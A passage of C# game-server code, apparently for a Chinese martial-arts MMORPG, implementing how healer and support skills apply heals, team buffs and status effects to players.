							移动(value34.人物坐标_X, value34.人物坐标_Y, 15f, value34.人物坐标_地图);
						}
						if (神女异常状态.ContainsKey(39))
						{
							if (超负荷等级 == 1)
							{
								base.人物_HP -= (int)((double)base.人物最大_HP * 0.05);
							}
							else if (超负荷等级 == 2)
							{
								base.人物_HP -= (int)((double)base.人物最大_HP * 0.1);
							}
							else if (超负荷等级 == 3)
							{
								base.人物_HP -= (int)((double)base.人物最大_HP * 0.15);
							}
						}
						if (神女异常状态.ContainsKey(36))
						{
							Random random2 = new Random();
							int fLD_PID = 武功类List[random2.Next(武功类List.Count)].FLD_PID;
							武功ID = fLD_PID;
						}
						if (value34.Player_Job == 13)
						{
							value34.万毒不侵 = false;
							if ((double)RNG.Next(1, 110) <= value34.神女万毒不侵)
							{
								value34.显示大字(value34.人物全服ID, 1023);
								value34.万毒不侵 = true;
							}
						}
						switch (武功ID)
						{
						case 501201:
						{
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							魔法使用(value23.FLD_MP);
							double num13 = 110.0 + base.医_妙手回春 + base.医_九天真气 * 1000.0;
							if ((double)RNG.Next(1, 100) <= base.医_升天二气功_万物回春)
							{
								num13 *= 2.0;
								显示大字(base.人物全服ID, 150);
							}
							value34.加血((int)num13);
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							value34.更新HP_MP_SP();
							更新HP_MP_SP();
							return;
						}
						case 501202:
						{
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							魔法使用(value23.FLD_MP);
							double num16 = 140.0 + base.医_妙手回春 + base.医_九天真气 * 1000.0;
							if ((double)RNG.Next(1, 100) <= base.医_升天二气功_万物回春)
							{
								num16 *= 2.0;
								显示大字(base.人物全服ID, 150);
							}
							value34.加血((int)num16);
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							value34.更新HP_MP_SP();
							更新HP_MP_SP();
							return;
						}
						case 501203:
						{
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							魔法使用(value23.FLD_MP);
							double num21 = 160.0 + base.医_妙手回春 + base.医_九天真气 * 1000.0;
							if ((double)RNG.Next(1, 100) <= base.医_升天二气功_万物回春)
							{
								num21 *= 2.0;
								显示大字(base.人物全服ID, 150);
							}
							double 狂意护体加成 = 0.0;
							double num22 = 0.0;
							double num24 = 0.0;
							double num25 = 0.0;
							if (base.医_狂意护体 > 0.0)
							{
								if (base.医_狂意护体 - base.医_无中生有 > 0.0)
								{
									num24 = base.医_狂意护体 - base.医_无中生有;
								}
								狂意护体加成 = num24 * 0.005;
								num22 = base.医_狂意护体 * 0.5;
								num25 = base.医_狂意护体;
							}
							if (组队id != 0)
							{
								if (World.Teams.TryGetValue(组队id, out var value53))
								{
									int 增加血量 = (int)num21;
									if (value34.人物全服ID == base.人物全服ID)
									{
										foreach (Players value73 in value53.组队列表.Values)
										{
											if (value73 != null && 查找范围玩家(World.群体辅助组队范围, value73))
											{
												if ((double)new Random().Next(1, 100) < num25 && !value73.追加状态列表.ContainsKey(700014))
												{
													value73.人物_SP += value73.人物最大_SP / 20;
													value73.更新HP_MP_SP();
												}
												if ((double)new Random().Next(1, 100) < num22 && !value73.追加状态列表.ContainsKey(700350))
												{
													value73.显示大字(value73.人物全服ID, 350);
													value73.状态效果(BitConverter.GetBytes(700350), 1, 363000);
													追加状态类 value54 = new 追加状态类(value73, 363000, 700350, 0);
													value73.狂意护体加成 = 狂意护体加成;
													value73.追加状态列表.Add(700350, value54);
													value73.addFLD_追加百分比_防御(value73.狂意护体加成);
													value73.更新武功和状态();
												}
											}
										}
										发送医生群疗数据(人物ID, value53, 增加血量, 武功ID, value23);
									}
									else
									{
										value34.加血((int)num21);
										value34.更新HP_MP_SP();
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
									}
								}
								else
								{
									value34.加血((int)num21);
									value34.更新HP_MP_SP();
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
								}
							}
							else
							{
								value34.加血((int)num21);
								if (value34.人物全服ID != base.人物全服ID)
								{
									value34.更新HP_MP_SP();
								}
								更新HP_MP_SP();
								发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							}
							return;
						}
						case 401301:
						{
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (World.Teams.TryGetValue(组队id, out var value37) && 人物ID == base.人物全服ID)
							{
								foreach (Players value74 in value37.组队列表.Values)
								{
									if (查找范围玩家(World.群体辅助组队范围, value74))
									{
										if (value74.GetAddState(武功ID))
										{
											value74.追加状态列表[武功ID].时间结束事件();
										}
										魔法使用(value23.FLD_MP);
										追加状态类 value38 = new 追加状态类(value74, 180000 + (int)base.弓_回流真气, 武功ID, 0);
										value74.追加状态列表.Add(武功ID, value38);
										value74.状态效果(BitConverter.GetBytes(武功ID), 1, 180000 + (int)base.弓_回流真气);
										value74.FLD_人物_武功攻击力增加百分比 += 0.1;
										更新HP_MP_SP();
									}
								}
								发送医生群体辅助数据(人物ID, value37, 0, 401301, value23);
							}
							else
							{
								if (value34.GetAddState(401301))
								{
									value34.追加状态列表[401301].时间结束事件();
								}
								魔法使用(value23.FLD_MP);
								追加状态类 value39 = new 追加状态类(value34, 180000 + (int)base.弓_回流真气, 武功ID, 0);
								value34.追加状态列表.Add(武功ID, value39);
								value34.状态效果(BitConverter.GetBytes(武功ID), 1, 180000 + (int)base.弓_回流真气);
								value34.FLD_人物_武功攻击力增加百分比 += 0.1;
								发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
								更新HP_MP_SP();
							}
							break;
						}
						case 401302:
						{
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (World.Teams.TryGetValue(组队id, out var value25) && 人物ID == base.人物全服ID)
							{
								foreach (Players value75 in value25.组队列表.Values)
								{
									if (查找范围玩家(World.群体辅助组队范围, value75))
									{
										if (value75.GetAddState(武功ID))
										{
											value75.追加状态列表[武功ID].时间结束事件();
										}
										魔法使用(value23.FLD_MP);
										追加状态类 value26 = new 追加状态类(value75, 180000 + (int)base.弓_回流真气, 武功ID, 0);
										value75.追加状态列表.Add(武功ID, value26);
										value75.状态效果(BitConverter.GetBytes(武功ID), 1, 180000 + (int)base.弓_回流真气);
										value75.FLD_人物_武功防御力增加百分比 += 0.1;
										更新HP_MP_SP();
									}
								}
								发送医生群体辅助数据(人物ID, value25, 0, 401302, value23);
							}
							else
							{
								if (value34.GetAddState(401302))
								{
									value34.追加状态列表[401302].时间结束事件();
								}
								魔法使用(value23.FLD_MP);
								追加状态类 value27 = new 追加状态类(value34, 180000 + (int)base.弓_回流真气, 武功ID, 0);
								value34.追加状态列表.Add(武功ID, value27);
								value34.状态效果(BitConverter.GetBytes(武功ID), 1, 180000 + (int)base.弓_回流真气);
								value34.FLD_人物_武功防御力增加百分比 += 0.1;
								发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
								更新HP_MP_SP();
							}
							break;
						}
						case 401303:
						{
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (value34.GetAddState(401303))
							{
								value34.追加状态列表[401303].时间结束事件();
							}
							魔法使用(value23.FLD_MP);
							追加状态类 value33 = new 追加状态类(value34, 185000 + (int)base.弓_回流真气, 武功ID, 0);
							value34.追加状态列表.Add(武功ID, value33);
							value34.状态效果(BitConverter.GetBytes(武功ID), 1, 185000 + (int)base.弓_回流真气);
							switch (value34.Player_Job)
							{
							case 1:
								if (value34.真武绝击 > 0.0)
								{
									value34.真武绝击 += 10.0;
								}
								break;
							case 2:
								if (value34.剑_怒海狂澜 > 0.0)
								{
									value34.剑_怒海狂澜 += 10.0;
								}
								break;
							case 3:
								if (value34.枪_怒意之吼 > 0.0)
								{
									value34.枪_怒意之吼 += 10.0;
								}
								break;
							case 4:
								if (value34.弓_致命绝杀 > 0.0)
								{
									value34.弓_致命绝杀 += 10.0;
								}
								break;
							case 5:
								if (value34.真武绝击 > 0.0)
								{
									value34.真武绝击 += 10.0;
								}
								break;
							case 6:
								if (value34.刺_心神凝聚 > 0.0)
								{
									value34.刺_心神凝聚 += 10.0;
								}
								break;
							case 7:
								if (value34.琴师_升天二气功_三潭映月 > 0.0)
								{
									value34.琴师_升天二气功_三潭映月 += 10.0;
								}
								break;
							case 8:
								if (value34.真武绝击 > 0.0)
								{
									value34.真武绝击 += 10.0;
								}
								break;
							case 9:
								if (value34.谭_怒海狂澜 > 0.0)
								{
									value34.谭_怒海狂澜 += 10.0;
								}
								break;
							case 12:
								if (value34.真武绝击 > 0.0)
								{
									value34.真武绝击 += 10.0;
								}
								break;
							case 13:
								if (value34.神女真武绝击 > 0.0)
								{
									value34.神女真武绝击 += 10.0;
								}
								break;
							}
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							更新HP_MP_SP();
							return;
						}
						case 401201:
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
							}
							else
							{
								魔法使用(value23.FLD_MP);
								发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
								更新HP_MP_SP();
							}
							return;
						case 401202:
						{
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (World.Teams.TryGetValue(组队id, out var value20) && 人物ID == base.人物全服ID)
							{
								foreach (Players value76 in value20.组队列表.Values)
								{
									if (查找范围玩家(World.群体辅助组队范围, value76))
									{
										if (value76.GetAddState(武功ID))
										{
											value76.追加状态列表[武功ID].时间结束事件();
										}
										魔法使用(value23.FLD_MP);
										追加状态类 value21 = new 追加状态类(value76, 18000 + (int)base.弓_回流真气, 武功ID, 0);
										value76.追加状态列表.Add(武功ID, value21);
										value76.状态效果(BitConverter.GetBytes(武功ID), 1, 180000 + (int)base.弓_回流真气);
										value76.FLD_人物_追加_命中 += 40;
										value76.FLD_人物_追加_回避 -= 20;
										value76.更新武功和状态();
										更新HP_MP_SP();
									}
								}
								发送医生群体辅助数据(人物ID, value20, 0, 401202, value23);
							}
							else
							{
								if (value34.GetAddState(401202))
								{
									value34.追加状态列表[401202].时间结束事件();
								}
								魔法使用(value23.FLD_MP);
								追加状态类 value22 = new 追加状态类(value34, 18000 + (int)base.弓_回流真气, 武功ID, 0);
								value34.追加状态列表.Add(武功ID, value22);
								value34.状态效果(BitConverter.GetBytes(武功ID), 1, 180000 + (int)base.弓_回流真气);
								value34.FLD_人物_追加_命中 += 40;
								value34.FLD_人物_追加_回避 -= 20;
								value34.更新武功和状态();
								发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
								更新HP_MP_SP();
							}
							break;
						}
						case 401203:
						{
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (World.Teams.TryGetValue(组队id, out var value9) && 人物ID == base.人物全服ID)
							{
								foreach (Players value77 in value9.组队列表.Values)
								{
									if (查找范围玩家(World.群体辅助组队范围, value77))
									{
										if (value77.GetAddState(武功ID))
										{
											value77.追加状态列表[武功ID].时间结束事件();
										}
										魔法使用(value23.FLD_MP);
										追加状态类 value10 = new 追加状态类(value77, 180000 + (int)base.弓_回流真气, 武功ID, 0);
										value77.追加状态列表.Add(武功ID, value10);
										value77.状态效果(BitConverter.GetBytes(武功ID), 1, 180000 + (int)base.弓_回流真气);
										value77.FLD_人物_追加_命中 -= 20;
										value77.FLD_人物_追加_回避 += 40;
										value77.更新武功和状态();
										更新HP_MP_SP();
									}
								}
								发送医生群体辅助数据(人物ID, value9, 0, 401203, value23);
							}
							else
							{
								if (value34.GetAddState(401203))
								{
									value34.追加状态列表[401203].时间结束事件();
								}
								魔法使用(value23.FLD_MP);
								追加状态类 value11 = new 追加状态类(value34, 180000 + (int)base.弓_回流真气, 武功ID, 0);
								value34.追加状态列表.Add(武功ID, value11);
								value34.状态效果(BitConverter.GetBytes(武功ID), 1, 180000 + (int)base.弓_回流真气);
								value34.FLD_人物_追加_命中 -= 20;
								value34.FLD_人物_追加_回避 += 40;
								value34.更新武功和状态();
								发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
								更新HP_MP_SP();
							}
							break;
						}
						case 501302:
						{
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (value34.追加状态列表 != null)
							{
								if (value34.GetAddState(501502))
								{
									value34.追加状态列表[501502].时间结束事件();
								}
								if (value34.GetAddState(501302))
								{
									value34.追加状态列表[501302].时间结束事件();
								}
								if (value34.GetAddState(501303))
								{
									value34.追加状态列表[501303].时间结束事件();
								}
							}
							魔法使用(value23.FLD_MP);
							double num2 = 180000.0 + base.医_吸星大法;
							double num3 = 0.05;
							if (base.医_九天真气 > 0.0)
							{
								num3 += base.医_九天真气;
							}
							追加状态类 value78 = new 追加状态类(value34, (int)num2, 武功ID, 0, num3);
							value34.追加状态列表.Add(武功ID, value78);
							value34.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num2);
							value34.addFLD_追加百分比_防御(num3);
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							升天四气功触发(null);
							更新HP_MP_SP();
							value34.更新武功和状态();
							return;
						}
						case 501303:
						case 501502:
						{
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							double num17 = 600000.0 + base.医_吸星大法;
							double num18 = 0.1;
							if (base.医_九天真气 > 0.0)
							{
								num18 += base.医_九天真气;
							}
							if (World.Teams.TryGetValue(组队id, out var value44) && 人物ID == base.人物全服ID)
							{
								foreach (Players value79 in value44.组队列表.Values)
								{
									if (查找范围玩家(World.群体辅助组队范围, value79))
									{
										if (value79.GetAddState(501502))
										{
											value79.追加状态列表[501502].时间结束事件();
										}
										if (value79.GetAddState(501302))
										{
											value79.追加状态列表[501302].时间结束事件();
										}
										if (value79.GetAddState(501303))
										{
											value79.追加状态列表[501303].时间结束事件();
										}
										追加状态类 value46 = new 追加状态类(value79, (int)num17, 武功ID, 0, num18);
										value79.追加状态列表.Add(武功ID, value46);
										value79.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num17);
										value79.addFLD_追加百分比_防御(num18);
										value79.更新武功和状态();
									}
								}
								发送医生群体辅助数据(人物ID, value44, 0, 武功ID, value23);
							}
							else
							{
								if (value34.追加状态列表 != null)
								{
									if (value34.GetAddState(501502))
									{
										value34.追加状态列表[501502].时间结束事件();
									}
									if (value34.GetAddState(501302))
									{
										value34.追加状态列表[501302].时间结束事件();
									}
									if (value34.GetAddState(501303))
									{
										value34.追加状态列表[501303].时间结束事件();
									}
								}
								追加状态类 value47 = new 追加状态类(value34, (int)num17, 武功ID, 0, num18);
								value34.追加状态列表.Add(武功ID, value47);
								value34.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num17);
								value34.addFLD_追加百分比_防御(num18);
								value34.更新武功和状态();
								发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							}
							魔法使用(value23.FLD_MP);
							升天四气功触发(null);
							更新HP_MP_SP();
							return;
						}
						case 501301:
						case 501501:
						{
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							double num14 = 600000.0 + base.医_吸星大法;
							double num15 = 0.1;
							if (base.医_九天真气 > 0.0)
							{
								num15 += base.医_九天真气;
							}
							if (World.Teams.TryGetValue(组队id, out var value40) && 人物ID == base.人物全服ID)
							{
								foreach (Players value80 in value40.组队列表.Values)
								{
									if (查找范围玩家(World.群体辅助组队范围, value80))
									{
										if (value80.GetAddState(501501))
										{
											value80.追加状态列表[501501].时间结束事件();
										}
										if (value80.GetAddState(501301))
										{
											value80.追加状态列表[501301].时间结束事件();
										}
										追加状态类 value41 = new 追加状态类(value80, (int)num14, 武功ID, 0, num15);
										value80.追加状态列表.Add(武功ID, value41);
										value80.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num14);
										value80.addFLD_追加百分比_攻击(num15);
										value80.更新武功和状态();
									}
								}
								发送医生群体辅助数据(人物ID, value40, 0, 武功ID, value23);
							}
							else
							{
								if (value34.追加状态列表 != null)
								{
									if (value34.GetAddState(501501))
									{
										value34.追加状态列表[501501].时间结束事件();
									}
									if (value34.GetAddState(501301))
									{
										value34.追加状态列表[501301].时间结束事件();
									}
								}
								追加状态类 value42 = new 追加状态类(value34, (int)num14, 武功ID, 0, num15);
								value34.追加状态列表.Add(武功ID, value42);
								value34.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num14);
								value34.addFLD_追加百分比_攻击(num15);
								value34.更新武功和状态();
								发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							}
							魔法使用(value23.FLD_MP);
							升天四气功触发(null);
							更新HP_MP_SP();
							return;
						}
						case 601201:
						{
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (value34.GetAddState(601201))
							{
								value34.追加状态列表[601201].时间结束事件();
							}
							追加状态类 value18 = new 追加状态类(value34, 1800000, 武功ID, 0);
							value34.追加状态列表.Add(武功ID, value18);
							value34.状态效果(BitConverter.GetBytes(武功ID), 1, 1800000);
							base.FLD_夫妻辅助_追加_防具_属性 = 1;
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							value34.计算人物装备数据();
							value34.更新武功和状态();
							魔法使用(value23.FLD_MP);
							更新HP_MP_SP();
							return;
						}
						case 501403:
						case 501601:
						{
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							double num8 = 600000.0 + base.医_吸星大法;
							double num9 = 0.1;
							if (base.医_九天真气 > 0.0)
							{
								num9 += base.医_九天真气;
							}
							if (World.Teams.TryGetValue(组队id, out var value15) && 人物ID == base.人物全服ID)
							{
								foreach (Players value81 in value15.组队列表.Values)
								{
									if (查找范围玩家(World.群体辅助组队范围, value81))
									{
										if (value81.GetAddState(501601))
										{
											value81.追加状态列表[501601].时间结束事件();
										}
										if (value81.GetAddState(501403))
										{
											value81.追加状态列表[501403].时间结束事件();
										}
										追加状态类 value16 = new 追加状态类(value81, (int)num8, 武功ID, 0, num9);
										value81.追加状态列表.Add(武功ID, value16);
										value81.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num8);
										value81.FLD_追加百分比_HP上限 += num9;
										value81.更新HP_MP_SP();
									}
								}
								发送医生群体辅助数据(人物ID, value15, 0, 武功ID, value23);
							}
							else
							{
								if (value34.追加状态列表 != null)
								{
									if (value34.GetAddState(501601))
									{
										value34.追加状态列表[501601].时间结束事件();
									}
									if (value34.GetAddState(501403))
									{
										value34.追加状态列表[501403].时间结束事件();
									}
								}
								追加状态类 value17 = new 追加状态类(value34, (int)num8, 武功ID, 0, num9);
								value34.追加状态列表.Add(武功ID, value17);
								value34.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num8);
								value34.FLD_追加百分比_HP上限 += num9;
								value34.更新HP_MP_SP();
								发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							}
							魔法使用(value23.FLD_MP);
							升天四气功触发(null);
							更新HP_MP_SP();
							return;
						}
						case 501401:
						case 501602:
						{
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							double num19 = 600000.0 + base.医_吸星大法;
							double num20 = 0.1;
							if (base.医_九天真气 > 0.0)
							{
								num20 += base.医_九天真气;
							}
							if (World.Teams.TryGetValue(组队id, out var value50) && 人物ID == base.人物全服ID)
							{
								foreach (Players value82 in value50.组队列表.Values)
								{
									if (查找范围玩家(World.群体辅助组队范围, value82))
									{
										if (value82.GetAddState(501602))
										{
											value82.追加状态列表[501602].时间结束事件();
										}
										if (value82.GetAddState(501401))
										{
											value82.追加状态列表[501401].时间结束事件();
										}
										追加状态类 value51 = new 追加状态类(value82, (int)num19, 武功ID, 0, num20);
										value82.追加状态列表.Add(武功ID, value51);
										value82.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num19);
										value82.FLD_追加百分比_命中 += num20;
										value82.更新武功和状态();
									}
								}
								发送医生群体辅助数据(人物ID, value50, 0, 武功ID, value23);
							}
							else
							{
								if (value34.追加状态列表 != null)
								{
									if (value34.GetAddState(501602))
									{
										value34.追加状态列表[501602].时间结束事件();
									}
									if (value34.GetAddState(501401))
									{
										value34.追加状态列表[501401].时间结束事件();
									}
								}
								追加状态类 value52 = new 追加状态类(value34, (int)num19, 武功ID, 0, num20);
								value34.追加状态列表.Add(武功ID, value52);
								value34.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num19);
								value34.FLD_追加百分比_命中 += num20;
								value34.更新武功和状态();
								发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							}
							魔法使用(value23.FLD_MP);
							升天四气功触发(null);
							更新HP_MP_SP();
							return;
						}
						case 501402:
						case 501603:
						{
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							double num4 = 600000.0 + base.医_吸星大法;
							double num5 = 0.1;
							if (base.医_九天真气 > 0.0)
							{
								num5 += base.医_九天真气;
							}
							if (World.Teams.TryGetValue(组队id, out var value3) && 人物ID == base.人物全服ID)
							{
								foreach (Players value83 in value3.组队列表.Values)
								{
									if (!查找范围玩家(World.群体辅助组队范围, value83))
									{
										continue;
									}
									if (value83.追加状态列表 != null)
									{
										if (value83.GetAddState(501603))
										{
											value83.追加状态列表[501603].时间结束事件();
										}
										if (value83.GetAddState(501402))
										{
											value83.追加状态列表[501402].时间结束事件();
										}
									}
									追加状态类 value4 = new 追加状态类(value83, (int)num4, 武功ID, 0, num5);
									value83.追加状态列表.Add(武功ID, value4);
									value83.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num4);
									value83.FLD_人物_追加百分比_回避 += num5;
									value83.更新武功和状态();
								}
								发送医生群体辅助数据(人物ID, value3, 0, 武功ID, value23);
							}
							else
							{
								if (value34.追加状态列表 != null)
								{
									if (value34.GetAddState(501603))
									{
										value34.追加状态列表[501603].时间结束事件();
									}
									if (value34.GetAddState(501402))
									{
										value34.追加状态列表[501402].时间结束事件();
									}
								}
								追加状态类 value5 = new 追加状态类(value34, (int)num4, 武功ID, 0, num5);
								value34.追加状态列表.Add(武功ID, value5);
								value34.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num4);
								value34.FLD_人物_追加百分比_回避 += num5;
								value34.更新武功和状态();
								发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							}
							魔法使用(value23.FLD_MP);
							升天四气功触发(null);
							更新HP_MP_SP();
							return;
						}
						case 601202:
						{
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							if (value34.GetAddState(601202))
							{
								value34.追加状态列表[601202].时间结束事件();
							}
							追加状态类 value36 = new 追加状态类(value34, 1800000, 武功ID, 0);
							value34.追加状态列表.Add(武功ID, value36);
							value34.状态效果(BitConverter.GetBytes(武功ID), 1, 1800000);
							base.FLD_夫妻辅助_追加_武器_属性 = 1;
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value34.人物_HP, 0, -1);
							value34.计算人物装备数据();
							value34.更新武功和状态();
							魔法使用(value23.FLD_MP);
							更新HP_MP_SP();
							return;
						}
						case 4000101:
							if (base.人物全服ID != 人物ID)
							{
								return;
							}
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							魔法使用(value23.FLD_MP);
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
							if (base.人物_AP < base.人物最大_AP)
							{
								base.人物_AP += value23.FLD_AT;
							}
							更新HP_MP_SP();
							return;
						case 3000401:
							if (base.人物全服ID == 人物ID)
							{
								if (base.人物_MP < value23.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value23.FLD_PID, 2);
								}
								else
								{
									魔法使用(value23.FLD_MP);
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
									更新HP_MP_SP();
								}
							}
							return;
						case 4000601:
							if (base.人物全服ID != 人物ID)
							{
								return;
							}
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							魔法使用(value23.FLD_MP);
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
							if (base.人物_AP < base.人物最大_AP)
							{
								base.人物_AP += value23.FLD_AT;
							}
							更新HP_MP_SP();
							return;
						case 4000501:
							if (base.人物全服ID != 人物ID)
							{
								return;
							}
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							魔法使用(value23.FLD_MP);
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
							if (base.人物_AP < base.人物最大_AP)
							{
								base.人物_AP += value23.FLD_AT;
							}
							更新HP_MP_SP();
							return;
						case 4000401:
							if (base.人物全服ID != 人物ID)
							{
								return;
							}
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							魔法使用(value23.FLD_MP);
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
							if (base.人物_AP < base.人物最大_AP)
							{
								base.人物_AP += value23.FLD_AT;
							}
							更新HP_MP_SP();
							return;
						case 4000801:
							if (base.人物全服ID != 人物ID)
							{
								return;
							}
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							魔法使用(value23.FLD_MP);
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
							if (base.人物_AP < base.人物最大_AP)
							{
								base.人物_AP += value23.FLD_AT;
							}
							更新HP_MP_SP();
							return;
						case 4000701:
							if (base.人物全服ID != 人物ID)
							{
								return;
							}
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							魔法使用(value23.FLD_MP);
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
							if (base.人物_AP < base.人物最大_AP)
							{
								base.人物_AP += value23.FLD_AT;
							}
							更新HP_MP_SP();
							return;
						case 4002101:
							if (base.人物全服ID != 人物ID)
							{
								return;
							}
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							魔法使用(value23.FLD_MP);
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
							if (base.人物_AP < base.人物最大_AP)
							{
								base.人物_AP += value23.FLD_AT;
							}
							更新HP_MP_SP();
							return;
						case 4000901:
							if (base.人物全服ID != 人物ID)
							{
								return;
							}
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							魔法使用(value23.FLD_MP);
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
							if (base.人物_AP < base.人物最大_AP)
							{
								base.人物_AP += value23.FLD_AT;
							}
							更新HP_MP_SP();
							return;
						case 4002401:
							if (base.人物全服ID != 人物ID)
							{
								return;
							}
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							魔法使用(value23.FLD_MP);
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
							if (base.人物_AP < base.人物最大_AP)
							{
								base.人物_AP += value23.FLD_AT;
							}
							更新HP_MP_SP();
							return;
						case 4002301:
							if (base.人物全服ID != 人物ID)
							{
								return;
							}
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							魔法使用(value23.FLD_MP);
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
							if (base.人物_AP < base.人物最大_AP)
							{
								base.人物_AP += value23.FLD_AT;
							}
							更新HP_MP_SP();
							return;
						case 4002201:
							if (base.人物全服ID != 人物ID)
							{
								return;
							}
							if (base.人物_MP < value23.FLD_MP)
							{
								魔法不足提示();
								发送激活技能数据(value23.FLD_PID, 2);
								return;
							}
							魔法使用(value23.FLD_MP);
							发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
							if (base.人物_AP < base.人物最大_AP)
							{
								base.人物_AP += value23.FLD_AT;
							}
							更新HP_MP_SP();
